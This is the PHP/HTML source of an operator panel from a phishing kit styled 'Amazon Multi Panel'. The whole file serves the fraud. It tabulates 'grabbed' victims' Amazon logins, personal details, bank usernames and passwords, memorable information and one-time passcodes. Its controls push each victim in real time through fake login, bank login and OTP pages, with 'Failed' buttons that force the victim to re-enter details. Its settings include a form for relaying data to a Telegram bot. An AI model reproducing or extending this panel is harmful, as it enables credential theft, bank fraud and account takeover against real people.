<?php
session_start();

header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Cache-Control: post-check=0, pre-check=0", false);
header("Pragma: no-cache");
?>

<!DOCTYPE html>
<html lang="en" data-layout="horizontal">

<head>
    <!-- Required meta tags -->
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />

    <!-- Favicon icon-->
    <!-- <link rel="shortcut icon" type="image/x-icon" href="../assets/images/favicon/favicon.ico" /> -->

    <!-- Color modes -->
    <!-- <script src="../assets/js/vendors/color-modes.js"></script> -->

    <!-- Libs CSS -->
    <link rel="stylesheet"
        href="https://cdnjs.cloudflare.com/ajax/libs/MaterialDesign-Webfont/7.3.67/css/materialdesignicons.min.css"
        integrity="sha512-nRzny9w0V2Y1/APe+iEhKAwGAc+K8QYCw4vJek3zXhdn92HtKt226zHs9id8eUq+uYJKaH2gPyuLcaG/dE5c7A=="
        crossorigin="anonymous" referrerpolicy="no-referrer" />
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"
        integrity="sha384-ka7Sk0Gln4gmtz2MlQnikT1wXgYsOg+OMhuP+IlRH9sENBO0LRn5q+8nbTov4+1p"
        crossorigin="anonymous"></script>
    <link href="assets/css/simplebar.css" rel="stylesheet" />
    <link rel="icon" type="image/x-icon" href="assets/img/logo.svg">

    <!-- Theme CSS -->
    <link rel="stylesheet" href="assets/css/theme.css">
    <style>
        .button-good:hover {
            background-color: #0d5b6f !important;
        }

        .hide-mobile-container {
            display: none !important;
        }
    </style>

    <title>Amazon Multi Panel - Dashboard</title>


</head>

<body>
    <main id="main-wrapper" class="main-wrapper">
        <div class="header">
            <!-- navbar -->
            <div class="navbar-custom navbar navbar-expand-lg" style="background: #1a1d23">
                <div class="container-fluid px-0">
                    <a class="navbar-brand d-block d-md-none" href="../index.html">
                        <img src="assets/logo.svg" alt="" style="width: 100px; height: 20px; object-fit: cover; ">
                    </a>

                    <a id="nav-toggle" href="#!" class="ms-auto ms-md-0 me-0 me-lg-3">
                        <svg xmlns="http://www.w3.org/2000/svg" width="28" height="28" fill="currentColor"
                            class="bi bi-text-indent-left text-muted" viewBox="0 0 16 16">
                            <path
                                d="M2 3.5a.5.5 0 0 1 .5-.5h11a.5.5 0 0 1 0 1h-11a.5.5 0 0 1-.5-.5zm.646 2.146a.5.5 0 0 1 .708 0l2 2a.5.5 0 0 1 0 .708l-2 2a.5.5 0 0 1-.708-.708L4.293 8 2.646 6.354a.5.5 0 0 1 0-.708zM7 6.5a.5.5 0 0 1 .5-.5h6a.5.5 0 0 1 0 1h-6a.5.5 0 0 1-.5-.5zm0 3a.5.5 0 0 1 .5-.5h6a.5.5 0 0 1 0 1h-6a.5.5 0 0 1-.5-.5zm-5 3a.5.5 0 0 1 .5-.5h11a.5.5 0 0 1 0 1h-11a.5.5 0 0 1-.5-.5z" />
                        </svg>
                    </a>
                    <ul
                        class="navbar-nav navbar-right-wrap ms-lg-auto d-flex nav-top-wrap align-items-center ms-4 ms-lg-0">
                        <!-- List -->
                        <!-- <li class="dropdown ms-2">
                            <a href="#" class="btn" style="color: white;display: flex; align-items: center;"
                                id="config-btn">
                                <svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" viewBox="0 0 256 256"
                                    style="height: 23px;width: 33px;">
                                    <path
                                        d="M25 2C12.31 2 2 12.31 2 25s10.31 23 23 23 23-10.31 23-23S37.69 2 25 2m0 2c11.61 0 21 9.39 21 21s-9.39 21-21 21S4 36.61 4 25 13.39 4 25 4m9.088 10.035c-.684 0-1.453.159-2.352.483-1.396.503-17.815 7.474-19.683 8.267-1.068.454-3.057 1.299-3.057 3.313 0 1.335.782 2.29 2.322 2.84.828.294 2.795.89 3.936 1.205.484.133.998.2 1.527.2 1.035 0 2.077-.257 2.893-.712q-.012.253.017.508c.123 1.05.77 2.037 1.73 2.642.629.396 5.758 3.833 6.524 4.38 1.076.768 2.266 1.175 3.438 1.175 2.24 0 2.991-2.313 3.353-3.424.525-1.613 2.491-14.73 2.713-17.043.151-1.585-.51-2.89-1.767-3.492a3.65 3.65 0 0 0-1.594-.342m0 2c.275 0 .52.046.728.147.473.227.714.733.641 1.498-.242 2.523-2.203 15.329-2.621 16.613-.358 1.098-.735 2.043-1.453 2.043s-1.503-.252-2.276-.805c-.773-.552-5.906-3.994-6.619-4.443-.625-.394-1.286-1.376-.355-2.326.767-.782 6.585-6.43 7.082-6.926.37-.371.197-.818-.166-.818-.125 0-.275.052-.43.18-.608.496-9.084 6.168-9.818 6.624-.486.302-1.239.52-2.02.52-.333 0-.67-.04-.994-.13-1.128-.31-3.037-.89-3.795-1.16-.729-.26-.994-.508-.994-.954 0-.634.895-1.072 1.838-1.473.996-.423 18.23-7.742 19.578-8.227.624-.226 1.195-.363 1.674-.363"
                                        transform="scale(5.12)" fill="#fff" font-family="none" font-weight="none"
                                        font-size="none" text-anchor="none" style="mix-blend-mode:normal"></path>
                                </svg>
                                Telegram Config
                            </a>
                        </li> -->
                    </ul>
                </div>
            </div>
        </div>
        <div class="modal fade gd-example-modal-xl" id="config-modal" tabindex="-1" aria-labelledby="modalLabel"
            aria-hidden="true">
            <div class="modal-dialog modal-dialog-centered">
                <div class="modal-content">
                    <div class="modal-header">
                        <h5 class="modal-title" id="add-edit-event-modal-title">Edit Telegram Details</h5>
                        <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                    </div>
                    <div id="success-message"
                        style="display: none; padding-left: 10px; padding-right: 10px; padding-top: 5px;">
                        <div class="alert alert-success" role="alert">
                            Configuration saved successfully!
                        </div>
                    </div>
                    <div class="modal-body">
                        <form method="post" id="config-form">
                            <!-- Telegram Bot Token -->
                            <div class="mb-3">
                                <label for="telegramBotToken" class="form-label">Telegram Bot Token</label>
                                <input type="text" id="telegramBotToken" class="form-control" name="telegramBotToken"
                                    required="" />
                            </div>
                            <!-- Telegram Chat ID -->
                            <div class="mb-3">
                                <label for="telegramChatId" class="form-label">Telegram Chat ID</label>
                                <input type="text" id="telegramChatId" class="form-control" name="telegramChatId"
                                    required="" />
                            </div>
                            <div class="mt-3">
                                <!-- Button -->
                                <div class="d-grid mt-6">
                                    <button type="submit" class="btn btn-secondary">Save</button>
                                </div>
                            </div>
                        </form>
                    </div>
                </div>
            </div>
        </div>

        <div id="app-content">

            <div class="bg-primary pt-12 pb-21 " style="background-color: #2a568c26 !important;"></div>
            <div class="container-fluid mt-n22">
                <div class="row">
                    <div class="col-lg-12 col-md-12 col-12">
                        <div style="margin-bottom: 20px; display: flex; align-items: center;">
                            <h3 style="margin-bottom: 0; margin-top: 0;">Amazon Multi Panel</h3>
                        </div>
                    </div>
                </div>
                <div class="row">
                    <div class="row">
                        <h4 class="mb-5 mt-3">Grabbed Data</h4>
                        <div class="col-12">
                            <!-- card -->
                            <div class="card mb-4">
                                <div class="card-header d-flex justify-content-between align-items-center">
                                    <p class="mb-0">Information of grabbed users, for Amazon live panel.</p>
                                </div>
                                <div class="card-body">
                                    <div class="table-responsive table-card">
                                        <table class="table text-nowrap mb-0 table-centered table-hover">
                                            <thead class="table-light">
                                                <tr>
                                                    <th>S/N</th>
                                                    <th>IP</th>
                                                    <th>USER | PASS</th>
                                                    <th>FULL NAME</th>
                                                    <th>DELIVERY ADDRESS</th>
                                                    <th>DATE OF BIRTH</th>
                                                    <th>CONTACT PHONE</th>
                                                    <th>SELECTED BANK</th>
                                                    <th>BANK EMAIL</th>
                                                    <th>BANK PASSWORD</th>
                                                    <th>MEMORABLE</th>
                                                    <th>BANK OTP</th>
                                                    <th>STATUS</th>
                                                    <th>TIMESTAMP</th>
                                                    <th>ACTIONS</th>
                                                </tr>
                                            </thead>
                                            <tbody id="all-data-list">
                                                <!-- Data will be displayed here -->
                                            </tbody>
                                        </table>

                                        <script>
                                            function formatStatus(status) {
                                                switch (status) {
                                                    case 'first':
                                                        return 'Home';
                                                    case 'login':
                                                        return 'Login 🔑';
                                                    case 'login_retry':
                                                        return 'Login Retry ❌';
                                                    case 'login2':
                                                        return 'Login 🔑';
                                                    case 'reschedule':
                                                        return 'Reschedule';
                                                    case 'bnk':
                                                        return 'Bank Selection 🏦';
                                                    case 'bnk_log':
                                                        return 'Bank Login 🔑';
                                                    case 'bnk_log_retry':
                                                        return 'Bank Login Retry ❌';
                                                    case 'bnk_memorable':
                                                        return 'Memorable';
                                                    case 'bnk_memorable_retry':
                                                        return 'Memorable Retry ❌';
                                                    case 'bnk_otp':
                                                        return 'OTP 🔢';
                                                    case 'bnk_otp_retry':
                                                        return 'OTP Retry ❌';
                                                    case 'done':
                                                        return 'Completed ✅';
                                                    case 'waiting':
                                                        return 'Waiting ⏳';
                                                    default:
                                                        return status;
                                                }
                                            }
                                        </script>
                                        <script>
                                            // Utility function to add cache-busting parameter
                                            function getCacheBustedUrl(url) {
                                                return `${url}?_=${new Date().getTime()}`;
                                            }

                                            function fetchDataTable() {
                                                // Configure fetch options to prevent caching
                                                const fetchOptions = {
                                                    method: 'GET',
                                                    headers: {
                                                        'Cache-Control': 'no-cache, no-store, must-revalidate',
                                                        'Pragma': 'no-cache',
                                                        'Expires': '0'
                                                    },
                                                    // Prevent browser from serving cached responses
                                                    cache: 'no-store'
                                                };

                                                // Add cache-busting parameter to URL
                                                fetch(getCacheBustedUrl('data/status.json'), fetchOptions)
                                                    .then(response => {
                                                        if (!response.ok) {
                                                            throw new Error(`HTTP error! status: ${response.status}`);
                                                        }
                                                        return response.json();
                                                    })
                                                    .then(data => {
                                                        const userList = document.getElementById('all-data-list');
                                                        userList.innerHTML = '';

                                                        // Filter data to only include users with 3 or more properties
                                                        const filteredData = Object.keys(data).filter(key => {
                                                            const user = data[key];
                                                            const userProperties = Object.keys(user).length;
                                                            return userProperties >= 3;
                                                        });

                                                        filteredData.forEach((key, index) => {
                                                            const user = data[key];
                                                            const userHTML = `
                                                                <tr data-key="${key}">
                                                                    <td>${index + 1}</td>
                                                                    <td>${key}</td>
                                                                    <td onclick="copyToClipboard(this)">${user.Em_User ?? ''} | ${user.Pass ?? ''}</td>
                                                                    <td onclick="copyToClipboard(this)">${user.FullName ?? ''}</td>
                                                                    <td onclick="copyToClipboard(this)">${user.DeliveryAddress ?? ''}</td>
                                                                    <td onclick="copyToClipboard(this)">${user.DateOfBirth ?? ''}</td>
                                                                    <td onclick="copyToClipboard(this)">${user.ContactPhoneNumber ?? ''}</td>
                                                                    <td onclick="copyToClipboard(this)">${user.SelectedBank ?? ''}</td>
                                                                    <td onclick="copyToClipboard(this)">${user.Email ?? ''}</td>
                                                                    <td onclick="copyToClipboard(this)">${user.Password ?? ''}</td>
                                                                    <td onclick="copyToClipboard(this)">${user.Memorable ?? ''}</td>
                                                                    <td onclick="copyToClipboard(this)">${user.OtpCode ?? ''}</td>
                                                                    <td>${formatStatus(user.Status)}</td>
                                                                    <td onclick="copyToClipboard(this)">${user.Timestamp ?? ''}</td>
                                                                    <td>
                                                                        <div class="d-flex gap-2 align-items-center">
                                                                            <div class="dropdown">
                                                                                <a class="btn btn-outline-white btn-sm command-btn" 
                                                                                style="background: #35445b;color: white;" 
                                                                                onclick="showModal('${key}')">
                                                                                    Command
                                                                                </a>
                                                                            </div>
                                                                            <div class="dropdown">
                                                                                <button class="btn btn-outline-white btn-sm"
                                                                                        style="background: #bd1c1c;color: white;"
                                                                                        onclick="deleteRecord('${key}')">
                                                                                    Delete
                                                                                </button>
                                                                            </div>
                                                                        </div>
                                                                    </td>
                                                                </tr>
                                                            `;
                                                            userList.innerHTML += userHTML;
                                                        });
                                                    })
                                                    .catch(error => {
                                                        console.error('Error fetching data:', error);
                                                        // Optionally retry the fetch after a short delay
                                                        setTimeout(fetchDataTable, 1000);
                                                    });
                                            }

                                            // Initial fetch
                                            fetchDataTable();

                                            // Set up periodic refresh
                                            const refreshInterval = 2000; // 2 seconds
                                            let intervalId = setInterval(fetchDataTable, refreshInterval);

                                            // Optional: Add event listeners for visibility changes
                                            document.addEventListener('visibilitychange', () => {
                                                if (document.hidden) {
                                                    // Clear interval when tab is not visible
                                                    clearInterval(intervalId);
                                                } else {
                                                    // Immediately fetch and restart interval when tab becomes visible
                                                    fetchDataTable();
                                                    intervalId = setInterval(fetchDataTable, refreshInterval);
                                                }
                                            });
                                        </script>


                                        <script>
                                            const userList = document.getElementById('all-data-list');
                                            let currentKey;
                                            let updateInterval;

                                            // Utility function to add cache-busting parameter
                                            function getCacheBustedUrl(url) {
                                                return `${url}?_=${new Date().getTime()}`;
                                            }

                                            function showModal(key) {
                                                // Clear any existing interval
                                                if (updateInterval) {
                                                    clearInterval(updateInterval);
                                                }

                                                currentKey = key;

                                                // Initial update
                                                updateUserData();

                                                // Start new interval
                                                updateInterval = setInterval(updateUserData, 1000);

                                                // Show the modal
                                                const commandModal = new bootstrap.Modal(document.getElementById('command-modal'));
                                                commandModal.show();

                                                // Add event listener for modal closing
                                                const modalElement = document.getElementById('command-modal');
                                                modalElement.addEventListener('hidden.bs.modal', () => {
                                                    // Clean up when modal is closed
                                                    clearInterval(updateInterval);
                                                    currentKey = null;
                                                }, { once: true }); // Use once: true to prevent multiple listener additions
                                            }

                                            // Event delegation for command button clicks
                                            userList.addEventListener('click', (e) => {
                                                if (e.target.classList.contains('command-btn')) {
                                                    const key = e.target.closest('tr').getAttribute('data-key');
                                                    showModal(key);
                                                }
                                            });

                                            function updateUserData() {
                                                // Configure fetch options to prevent caching
                                                const fetchOptions = {
                                                    method: 'GET',
                                                    headers: {
                                                        'Cache-Control': 'no-cache, no-store, must-revalidate',
                                                        'Pragma': 'no-cache',
                                                        'Expires': '0'
                                                    },
                                                    cache: 'no-store'
                                                };

                                                fetch(getCacheBustedUrl('data/status.json'), fetchOptions)
                                                    .then(response => {
                                                        if (!response.ok) {
                                                            throw new Error(`HTTP error! status: ${response.status}`);
                                                        }
                                                        return response.json();
                                                    })
                                                    .then(data => {
                                                        if (currentKey && data[currentKey]) {
                                                            const user = data[currentKey];

                                                            // Update modal elements with new data
                                                            const elements = {
                                                                'ip-address': currentKey,
                                                                'user-pass': `${user.Em_User ?? ''} | ${user.Pass ?? ''}`,
                                                                'full-name': user.FullName ?? '',
                                                                'delivery-address': user.DeliveryAddress ?? '',
                                                                'date-of-birth': user.DateOfBirth ?? '',
                                                                'contact-phone': user.ContactPhoneNumber ?? '',
                                                                'selected-bank': user.SelectedBank ?? '',
                                                                'bank-email': user.Email ?? '',
                                                                'bank-password': user.Password ?? '',
                                                                'memorable-details': user.Memorable ?? '',
                                                                'bank-otp': user.OtpCode ?? '',
                                                                'status': formatStatus(user.Status)
                                                            };

                                                            // Update each element if it exists
                                                            Object.entries(elements).forEach(([id, value]) => {
                                                                const element = document.getElementById(id);
                                                                if (element && element.innerText !== value) {
                                                                    element.innerText = value;
                                                                }
                                                            });
                                                        }
                                                    })
                                                    .catch(error => {
                                                        console.error('Error updating modal data:', error);
                                                        // Optionally implement retry logic
                                                        setTimeout(updateUserData, 1000);
                                                    });
                                            }

                                            // Add visibility change handler
                                            document.addEventListener('visibilitychange', () => {
                                                if (document.hidden) {
                                                    // Clear interval when tab is not visible
                                                    if (updateInterval) {
                                                        clearInterval(updateInterval);
                                                    }
                                                } else if (currentKey) {
                                                    // Restart interval only if modal is still open
                                                    updateUserData();
                                                    updateInterval = setInterval(updateUserData, 1000);
                                                }
                                            });

                                            // Optional: Add a function to manually trigger an update
                                            function forceModalUpdate() {
                                                if (currentKey) {
                                                    updateUserData();
                                                }
                                            }

                                            function deleteRecord(ip) {
                                                if (confirm(`Are you sure you want to delete the record for ${ip}?`)) {
                                                    // Create form data
                                                    const formData = new FormData();
                                                    formData.append('ip', ip);

                                                    // Send POST request to PHP
                                                    fetch('data/delete.php', {
                                                        method: 'POST',
                                                        body: formData
                                                    })
                                                        .then(response => response.json())
                                                        .then(data => {
                                                            if (data.success) {
                                                                fetchDataTable();
                                                            } else {
                                                                alert(data.message || 'Error deleting record');
                                                            }
                                                        })
                                                        .catch(error => {
                                                            console.error('Error:', error);
                                                            alert('Error deleting record');
                                                        });
                                                }
                                            }
                                        </script>

                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <div>

                <style>
                    .button-good {
                        background: #18778e;
                        border: none;
                        padding-top: 0;
                        padding-bottom: 0px;
                        height: 30px;
                        font-size: 12px;
                        width: 80px;
                    }

                    .button-bad {
                        background: #b0152b !important;
                        border: none;
                        padding-top: 0;
                        padding-bottom: 0px;
                        height: 30px;
                        font-size: 12px;
                        width: 80px;
                    }
                </style>
                <div class="modal fade gd-example-modal-xl" id="command-modal" tabindex="-1"
                    aria-labelledby="modalLabel" aria-hidden="true">
                    <div class="modal-dialog modal-dialog-centered">
                        <div class="modal-content">
                            <div class="modal-header">
                                <h5 class="modal-title">Send Command to User</h5>
                                <button type="button" class="btn-close" data-bs-dismiss="modal"
                                    aria-label="Close"></button>
                            </div>
                            <div id="success-message-command"
                                style="display: none; padding-left: 10px; padding-right: 10px; padding-top: 5px;">
                                <div class="alert alert-success" role="alert"
                                    style="padding-top: 10px;padding-bottom: 10px;margin-bottom: 0px;">
                                    Command sent successfully!
                                </div>
                            </div>
                            <div class="modal-body">
                                <strong>User Information</strong>

                                <div class="mt-3 gap-3"
                                    style="border: 1px solid #dde4ea;padding: 10px;border-radius: 7px;">
                                    <div class="d-flex flex-row justify-content-between">
                                        <label class="mb-0">IP Address:</label>
                                        <div class="d-flex mt-0"><span style="font-weight: 600" id="ip-address"></div>
                                    </div>
                                </div>

                                <div class="mt-3 gap-3"
                                    style="border: 1px solid #dde4ea;padding: 10px;border-radius: 7px;">
                                    <div class="d-flex flex-row justify-content-between">
                                        <label class="mb-0">USER | PASS:</label>
                                        <div class="d-flex mt-0"><span onclick="copyToClipboard(this)"
                                                style="font-weight: 600" id="user-pass"></span></div>
                                    </div>
                                    <div class="d-flex flex-row justify-content-between">
                                        <label class="mb-0">FULL NAME:</label>
                                        <div class="d-flex mt-0"><span onclick="copyToClipboard(this)"
                                                style="font-weight: 600" id="full-name"></span></div>
                                    </div>
                                    <div class="d-flex flex-row justify-content-between">
                                        <label class="mb-0">DELIVERY ADDRESS:</label>
                                        <div class="d-flex mt-0"><span onclick="copyToClipboard(this)"
                                                style="font-weight: 600" id="delivery-address"></span></div>
                                    </div>
                                    <div class="d-flex flex-row justify-content-between">
                                        <label class="mb-0">DATE OF BIRTH:</label>
                                        <div class="d-flex mt-0"><span onclick="copyToClipboard(this)"
                                                style="font-weight: 600" id="date-of-birth"></span></div>
                                    </div>
                                    <div class="d-flex flex-row justify-content-between">
                                        <label class="mb-0">CONTACT PHONE:</label>
                                        <div class="d-flex mt-0"><span onclick="copyToClipboard(this)"
                                                style="font-weight: 600" id="contact-phone"></span></div>
                                    </div>
                                    <div class="d-flex flex-row justify-content-between">
                                        <label class="mb-0">SELECTED BANK:</label>
                                        <div class="d-flex mt-0"><span onclick="copyToClipboard(this)"
                                                style="font-weight: 600" id="selected-bank"></span></div>
                                    </div>
                                    <div class="d-flex flex-row justify-content-between">
                                        <label class="mb-0">BANK USERNAME:</label>
                                        <div class="d-flex mt-0"><span onclick="copyToClipboard(this)"
                                                style="font-weight: 600" id="bank-email"></span></div>
                                    </div>
                                    <div class="d-flex flex-row justify-content-between">
                                        <label class="mb-0">BANK PASSWORD:</label>
                                        <div class="d-flex mt-0"><span onclick="copyToClipboard(this)"
                                                style="font-weight: 600" id="bank-password"></span></div>
                                    </div>
                                    <div class="d-flex flex-row justify-content-between">
                                        <label class="mb-0">MEMORABLE:</label>
                                        <div class="d-flex mt-0"><span onclick="copyToClipboard(this)"
                                                style="font-weight: 600" id="memorable-details"></span></div>
                                    </div>
                                    <div class="d-flex flex-row justify-content-between">
                                        <label class="mb-0">OTP:</label>
                                        <div class="d-flex mt-0"><span onclick="copyToClipboard(this)"
                                                style="font-weight: 600" id="bank-otp"></span></div>
                                    </div>
                                    <div class="d-flex flex-row justify-content-between">
                                        <label class="mb-0">STATUS:</label>
                                        <div class="d-flex mt-0"><span style="font-weight: 600" id="status"></span></div>
                                    </div>
                                </div>

                                <p class="mt-4">Click on any button below to send the command (page) to
                                    the user.</p>

                                <div class="mt-3 gap-3">

                                    <div class="d-flex flex-row justify-content-between mt-3"
                                        style="border: 1px solid #dde4ea;padding: 10px;border-radius: 7px;background: #e4e8ea2e;align-items: center;">
                                        <label class="form-label mb-0">FIRST PAGE</label>
                                        <div>
                                            <button class="btn btn-primary button-good"
                                                style="background: #18518e; border: none" id="first-btn">Send</button>
                                        </div>
                                    </div>

                                    <div class="d-flex flex-row justify-content-between mt-3"
                                        style="border: 1px solid #dde4ea;padding: 10px;border-radius: 7px;background: #e4e8ea2e;align-items: center;">
                                        <label class="form-label mb-0">LOGIN</label>
                                        <div>
                                            <button class="btn btn-primary button-good"
                                                style="background: #18518e; border: none" id="login-btn">Send</button>
                                            <button class="btn btn-primary button-bad"
                                                style="background: #b0152b; border: none" id="login-retry-btn">Failed</button>
                                        </div>
                                    </div>

                                    <!-- <div class="d-flex flex-row justify-content-between mt-3"
                                        style="border: 1px solid #dde4ea;padding: 10px;border-radius: 7px;background: #e4e8ea2e;align-items: center;">
                                        <label class="form-label mb-0">LOGIN 2</label>
                                        <div>
                                            <button class="btn btn-primary button-good"
                                                style="background: #18518e; border: none" id="login2-btn">Send</button>
                                        </div>
                                    </div> -->

                                    <div class="d-flex flex-row justify-content-between mt-3"
                                        style="border: 1px solid #dde4ea;padding: 10px;border-radius: 7px;background: #e4e8ea2e;align-items: center;">
                                        <label class="form-label mb-0">RESCHEDULE</label>
                                        <div>
                                            <button class="btn btn-primary button-good"
                                                style="background: #18518e; border: none" id="reschedule-btn">Send</button>
                                        </div>
                                    </div>

                                    <div class="d-flex flex-row justify-content-between mt-3"
                                        style="border: 1px solid #dde4ea;padding: 10px;border-radius: 7px;background: #e4e8ea2e;align-items: center;">
                                        <label class="form-label mb-0">BANK SELECTION</label>
                                        <div>
                                            <button class="btn btn-primary button-good"
                                                style="background: #18518e; border: none" id="bnk-btn">Send</button>
                                        </div>
                                    </div>

                                    <div class="d-flex flex-row justify-content-between mt-3"
                                        style="border: 1px solid #dde4ea;padding: 10px;border-radius: 7px;background: #e4e8ea2e;align-items: center;">
                                        <label class="form-label mb-0">BANK LOGIN</label>
                                        <div>
                                            <button class="btn btn-primary button-good"
                                                style="background: #18518e; border: none" id="bnk-log-btn">Send</button>
                                            <button class="btn btn-primary button-bad"
                                                style="background: #b0152b; border: none" id="bnk-log-retry-btn">Failed</button>
                                        </div>
                                    </div>

                                    <div class="d-flex flex-row justify-content-between mt-3"
                                        style="border: 1px solid #dde4ea;padding: 10px;border-radius: 7px;background: #e4e8ea2e;align-items: center;">
                                        <label class="form-label mb-0">MEMORABLE</label>
                                        <div>
                                            <button class="btn btn-primary button-good"
                                                style="background: #18518e; border: none" id="bnk-memorable-btn">Send</button>
                                            <button class="btn btn-primary button-bad"
                                                style="background: #b0152b; border: none" id="bnk-memorable-retry-btn">Failed</button>
                                        </div>
                                    </div>

                                    <div class="d-flex flex-row justify-content-between mt-3"
                                        style="border: 1px solid #dde4ea;padding: 10px;border-radius: 7px;background: #e4e8ea2e;align-items: center;">
                                        <label class="form-label mb-0">BANK OTP</label>
                                        <div>
                                            <button class="btn btn-primary button-good"
                                                style="background: #18518e; border: none" id="bnk-otp-btn">Send</button>
                                            <button class="btn btn-primary button-bad"
                                                style="background: #b0152b; border: none" id="bnk-otp-retry-btn">Failed</button>
                                        </div>
                                    </div>

                                    <div class="d-flex flex-row justify-content-between mt-3"
                                        style="border: 1px solid #dde4ea;padding: 10px;border-radius: 7px;background: #e4e8ea2e;align-items: center;">
                                        <label class="form-label mb-0">COMPLETED</label>
                                        <div>
                                            <button class="btn btn-primary button-good"
                                                style="background: #278e18; border: none" id="done-btn">Success</button>
                                        </div>
                                    </div>

                                </div>
                            </div>
                        </div>
                    </div>
                </div>

    </main>


    <!-- Scripts -->
    <script src="assets/js/maincodefunctions.js"></script>
    <!-- flatpickr -->
    <script src="assets/js/flatpickr.js"></script>

    <!-- Libs JS -->

    <script src="assets/js/bootstrap.js"></script>
    <script src="assets/js/feather.js"></script>
    <script src="assets/js/simplebar.js"></script>

    <!-- Theme JS -->
    <script src="assets/js/theme.js"></script>

    <!-- popper js -->
    <script src="assets/js/popper.js"></script>
    <!-- tippy js -->
    <script src="assets/js/tippy.js"></script>
    <script src="assets/js/tooltip.js"></script>

    <script>
        const commandModal = document.getElementById('command-modal');

        commandModal.addEventListener('hidden.bs.modal', () => {
            document.querySelector('.modal-backdrop').remove();
        });

        commandModal.addEventListener('hidden.bs.modal', () => {
            window.history.replaceState({}, '', window.location.href.split('?')[0]);
        });

        // Add event listeners with error checking
        const addEventListenerSafely = (id, action) => {
            const element = document.getElementById(id);
            if (element) {
                element.addEventListener('click', () => {
                    const ipAddress = document.getElementById('ip-address').innerText;
                    console.log(`${id} clicked, sending action: ${action}, IP:`, ipAddress);
                    sendCommand(ipAddress, action);
                });
            } else {
                console.warn(`Element with id '${id}' not found`);
            }
        };

        // Add all event listeners
        addEventListenerSafely('first-btn', 'first');
        addEventListenerSafely('login-btn', 'login');
        addEventListenerSafely('login-retry-btn', 'login_retry');
        addEventListenerSafely('login2-btn', 'login2');
        addEventListenerSafely('reschedule-btn', 'reschedule');
        addEventListenerSafely('bnk-btn', 'bnk');
        addEventListenerSafely('bnk-log-btn', 'bnk_log');
        addEventListenerSafely('bnk-log-retry-btn', 'bnk_log_retry');
        addEventListenerSafely('bnk-memorable-btn', 'bnk_memorable');
        addEventListenerSafely('bnk-memorable-retry-btn', 'bnk_memorable_retry');
        addEventListenerSafely('bnk-otp-btn', 'bnk_otp');
        addEventListenerSafely('bnk-otp-retry-btn', 'bnk_otp_retry');
        addEventListenerSafely('done-btn', 'done');

    </script>
    <script>
        function sendCommand(ip, action) {
            const params = new URLSearchParams();
            params.append('action', action);
            params.append('IP', ip);

            fetch('data/panel_controller.php', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: params
            })
                .then(response => response.json())
                .then(data => {
                    console.log('Request successful:', data);
                    showSuccessMessage(); // Show success message
                })
                .catch(error => {
                    console.error('Request failed:', error);
                });
        }

        function sendCard(ip, action, cardReaderCode) {
            const params = new URLSearchParams();
            params.append('action-card', action);
            params.append('IP', ip);
            params.append('CardReaderCode', cardReaderCode);

            fetch('data/panel_controller.php', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: params
            })
                .then(response => response.json())
                .then(data => {
                    console.log('Request successful:', data);
                    showSuccessMessage(); // Show success message
                })
                .catch(error => {
                    console.error('Request failed:', error);
                });
        }



        function showSuccessMessage() {
            const successMessage = document.getElementById('success-message-command');
            successMessage.style.display = 'block'; // Show message
            setTimeout(() => {
                successMessage.style.display = 'none'; // Hide message after 3 seconds
            }, 3000);
        }
    </script>
    <script>

        // Parse query parameters
        const params = new URLSearchParams(window.location.search);

        // Check if 'p' parameter is 'yes'
        if (params.get('p') === 'yes') {
            const ip = params.get('ip');
            showModal(ip); // Show modal with IP as key
        }

    </script>


</body>

</html>